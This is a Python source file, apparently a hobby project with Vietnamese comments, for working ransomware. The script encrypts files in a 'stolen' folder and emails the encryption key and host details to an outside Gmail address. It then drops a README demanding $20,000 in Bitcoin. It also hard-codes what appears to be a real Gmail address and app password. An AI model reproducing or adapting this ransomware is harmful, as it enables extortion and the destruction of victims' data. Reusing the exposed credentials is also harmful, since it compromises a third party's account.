import os
from cryptography.fernet import Fernet
import platform
import smtplib
from email.mime.text import MIMEText

def make_README():
    with open("README.md", "w") as f:
        f.write("Good day, your all of files in this folder was under control.\n If your want to open these file, you must send me 20.000$ in BTC and the receive the key to decode all of encrypted files.\n Here is my BTC address: 123fhbd867234jksfsdfasdhjsvdfgasd\n You must transfer bitcoins by the end of the day !")

### use to alert the victime be hacked
def send_email(private_key, info_computer,hostname):
    print("[TODO] Handling connect to the remote server...")
    sender_email = "lehaitien42.designer@gmail.com"
    sender_password = "imvx gcwq jthk bvuk"

    receiver_email = "lehaitien422003dev@gmail.com"

    message = MIMEText(f"Private Key: {private_key}\n {info_computer}")
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = f"Computer {hostname} has been hacked, let's check out !"

    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver_email, message.as_string())

    return True

# Get the computer's network name 
hostname = platform.node()
# Get the computer's system platform
system_platform = platform.system()
# Get the computer's processor architecture
processor_architecture = platform.processor()
# Get the computer's operating system name and version
operating_system = platform.platform()
# Get the computer's Python version
python_version = platform.python_version()

# table_data = [
#     ["Hostname", hostname],
#     ["System Platform", system_platform],
#     ["Processor Architecture", processor_architecture],
#     ["Operating System", operating_system],
#     ["Python Version", python_version]
# ]

table_keyValue = {
    "---Hostname": hostname,
    "---System Platform": system_platform,
    "---Processor Architecture": processor_architecture,
    "---Operating System": operating_system,
    "---Python Version": python_version
}
table = ""
for key, value in table_keyValue.items():
    table += f"{key}: {value}\n"
   

#table = tabulate(table_data, headers=["Computer", "Information"], tablefmt="grid")

print("[TODO] Encrypting....")
# get private key to encrypt
key = Fernet.generate_key()
fernet = Fernet(key)
print("[COMPLETED] Generated the private key.")

# Write the secret key to the file
with open("Secret.key", 'wb') as f:
    #f.write(Fakekey) 
    #- do not turn on this because you dont want victim know the private key 
    pass

#send the priKey of victim to email
while True:
    if send_email(key, table,hostname): 
        print("[COMPLETED] Connected to server successfully!") 
        break
    else:
        print("[ERROR] Failed to connect to server!")

# Đường dẫn đến thư mục "stolen"
stolen_folder = "stolen"
if not os.path.exists(stolen_folder):
    print("[ERROR] Can not find stolen folder !")

print("[COMPLETED] Stolen folder found!") 
# Đường dẫn đến thư mục "encrypted"
encrypted_folder = "encrypted"

# Tạo thư mục "encrypted" nếu chưa tồn tại
if not os.path.exists(encrypted_folder):
    os.makedirs(encrypted_folder)
    print("[COMPLETED] Generated encrypted folder!")

# Lặp qua các tệp tin trong thư mục "stolen"
for root, dirs, files in os.walk(stolen_folder):
    for file in files:
        file_path = os.path.join(root, file)
        with open(file_path, 'rb') as f:
            data = f.read()
        encrypted_data = fernet.encrypt(data)
        encrypted_file_path = os.path.join(encrypted_folder, file)
        #Change file name
        file_name, file_extension = os.path.splitext(encrypted_file_path)
        encrypted_file_path_with_extension = f"{file_name}.lihitiEncrypted{file_extension}"
        
        with open(encrypted_file_path_with_extension, 'wb') as f:
            f.write(encrypted_data)
        print("[COMPLETED] Encode done: "+encrypted_file_path_with_extension)

make_README()



print("[COMPLETED] Encypted Completed !!!")

